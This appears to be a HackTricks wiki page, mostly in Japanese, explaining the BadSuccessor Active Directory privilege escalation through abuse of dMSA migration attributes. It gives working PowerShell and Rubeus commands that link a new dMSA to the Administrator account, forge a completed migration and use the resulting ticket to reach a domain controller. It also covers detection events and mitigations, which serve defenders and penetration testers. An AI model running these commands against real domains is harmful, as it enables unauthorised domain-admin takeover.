# BadSuccessor: Privilege Escalation via Delegated MSA Migration Abuse

{{#include ../../banners/hacktricks-training.md}}

## 概要

Delegated Managed Service Accounts (**dMSA**) は、Windows Server 2025 に搭載される **gMSA** の次世代の後継です。正当な移行ワークフローにより、管理者は *古い* アカウント（ユーザー、コンピュータ、またはサービスアカウント）を dMSA に置き換え、権限を透過的に保持することができます。このワークフローは、`Start-ADServiceAccountMigration` や `Complete-ADServiceAccountMigration` などの PowerShell コマンドレットを通じて公開されており、**dMSA オブジェクト**の 2 つの LDAP 属性に依存しています：

* **`msDS-ManagedAccountPrecededByLink`** – *DN リンク* で、前の（古い）アカウントへのリンク。
* **`msDS-DelegatedMSAState`**       – 移行状態（`0` = なし、`1` = 進行中、`2` = *完了*）。

攻撃者が OU 内に **任意の** dMSA を作成し、これら 2 つの属性を直接操作できる場合、LSASS と KDC は dMSA をリンクされたアカウントの *後継* として扱います。攻撃者がその後 dMSA として認証すると、**リンクされたアカウントのすべての権限を継承します** – 管理者アカウントがリンクされている場合は **Domain Admin** まで。

この技術は、2025 年に Unit 42 によって **BadSuccessor** と名付けられました。執筆時点では **セキュリティパッチ** は利用できず、OU 権限の強化のみが問題を軽減します。

### 攻撃の前提条件

1. **組織単位 (OU)** 内にオブジェクトを作成することが *許可されている* アカウント *かつ* 次のいずれかを持っていること：
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** オブジェクトクラス
* `Create Child` → **`All Objects`** （一般的な作成）
2. LDAP および Kerberos へのネットワーク接続（標準のドメイン参加シナリオ / リモート攻撃）。

## 脆弱な OU の列挙

Unit 42 は、各 OU のセキュリティ記述子を解析し、必要な ACE を強調表示する PowerShell ヘルパースクリプトを公開しました：
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
スクリプトは、`(objectClass=organizationalUnit)` のページ付き LDAP 検索を実行し、すべての `nTSecurityDescriptor` をチェックします。

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (オブジェクトクラス *msDS-DelegatedManagedServiceAccount*)

## 攻撃手順

書き込み可能な OU が特定されると、攻撃は LDAP 書き込み 3 回で完了します:
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
レプリケーション後、攻撃者は単に **logon** して `attacker_dMSA$` としてログインするか、Kerberos TGTを要求できます - Windowsは*superseded*アカウントのトークンを構築します。

### 自動化

いくつかの公開されたPoCは、パスワードの取得とチケット管理を含む全体のワークフローをラップしています：

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
* NetExecモジュール – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

### ポストエクスプロイト
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Detection & Hunting

**Object Auditing**をOUで有効にし、以下のWindowsセキュリティイベントを監視します：

* **5137** – **dMSA**オブジェクトの作成
* **5136** – **`msDS-ManagedAccountPrecededByLink`**の変更
* **4662** – 特定の属性の変更
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – dMSAのTGT発行

`4662`（属性の変更）、`4741`（コンピュータ/サービスアカウントの作成）、および`4624`（その後のログオン）を相関させることで、BadSuccessorの活動がすぐに明らかになります。 **XSIAM**のようなXDRソリューションは、すぐに使用できるクエリを搭載しています（参照を参照）。

## Mitigation

* **最小権限の原則**を適用する – 信頼できる役割にのみ*サービスアカウント*の管理を委任します。
* 明示的に必要としないOUから`Create Child` / `msDS-DelegatedManagedServiceAccount`を削除します。
* 上記のイベントIDを監視し、dMSAを作成または編集する*非Tier-0*のアイデンティティに警告を出します。

## See also


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [Unit42 – When Good Accounts Go Bad: Exploiting Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
